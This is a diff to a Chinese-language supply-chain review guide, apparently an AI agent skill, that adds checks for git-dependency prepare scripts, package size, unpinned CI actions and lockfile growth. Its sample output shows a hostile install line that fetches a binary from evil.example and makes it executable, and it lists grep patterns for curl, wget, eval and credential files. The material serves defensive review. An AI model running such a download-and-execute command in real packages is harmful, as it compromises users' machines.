@@ -4,7 +4,7 @@ description: 'PR/新依赖快速供应链评审：危险 install/postinstall 脚
 whenToUse: '评审含新依赖（package.json/锁文件变更）的 PR、审查某包的 install 脚本行为、判断疑似 typosquat 包或验证构建可复现性时使用；纯业务代码、与新增依赖无关的 PR 评审不触发本技能。'
 metadata:
   pack: dsh-skill-pack-security
-  version: '1.0.0'
+  version: '1.2.0'
 ---
 
 # 新增依赖快速评审（supply-chain-review）
@@ -55,6 +55,8 @@ grep -rnE '(curl|wget|base64|eval|\.ssh|npmrc)' .tmp/package/package.json .tmp/p
 样例输出：`.tmp/package/scripts/download.js:3:curl -sSL https://evil.example/x -o /tmp/x && chmod +x /tmp/x`
 误报判据：**构建工具链的安装脚本是生态惯例**（esbuild、sharp、node-gyp、core-js 等）——放行判据 = 脚本行为与包用途一致 且 不触碰用户凭据/全局配置；两者任一不满足 = 阻断级。
 阻断条件（任一即阻断）：下载并执行二进制、访问凭据文件、混淆载荷（base64/hex 拼装后 eval）、安装后写全局配置。
+git 安装向量：依赖来自 git URL 时（DSH 的 git 安装会执行 `prepare` 脚本），`npm view` 看不到其脚本——先 `git grep -nE 'git\+https?://' -- package.json` 定位，再 `git clone --depth 1 <url> .tmp/gitdep` 后 `grep -nE '"(prepare|preinstall)"' .tmp/gitdep/package.json`；`prepare` 在安装时执行，与 postinstall 同级对待。
+包体异常：`npm view <包> dist.fileCount dist.tarball --json`。判据：fileCount 异常大（如 >1000）或 tarball 域名非 `registry.npmjs.org` → 记录并人工复核。
 
 ## 2. typosquat 检查
 
@@ -85,6 +87,8 @@ pnpm install --frozen-lockfile
 - 缺任一 = 要求修改；
 - 缺锁文件 **且** 新增直接依赖 > 20 个 = 阻断。
 - `pnpm install --frozen-lockfile` 失败样例与处理转 `dependency-audit` 第 5 节；平台差异不关冻结开关。
+- CI 配置复核（PR 改了 workflow 时必查）：`git diff <base>...HEAD -- .github/workflows | grep -nE '^\+.*uses:'`——新增/改动的 `uses: <owner>/<repo>@v<数字>` 未 pin 到 commit SHA（`@<40位hex>`）→ 要求修改（tag 可被移动）；只读、不触密钥的第三方 action 记录即可，不阻断。
+- 锁文件新增量复核：`git diff <base>...HEAD -- <锁文件> | grep -cE '^\+'` 与新增直接依赖数对照；声明 1 个依赖却 +500 行 → 记录并人工核对 diff 内容。
 
 ## 4. 结论与评论模板
 
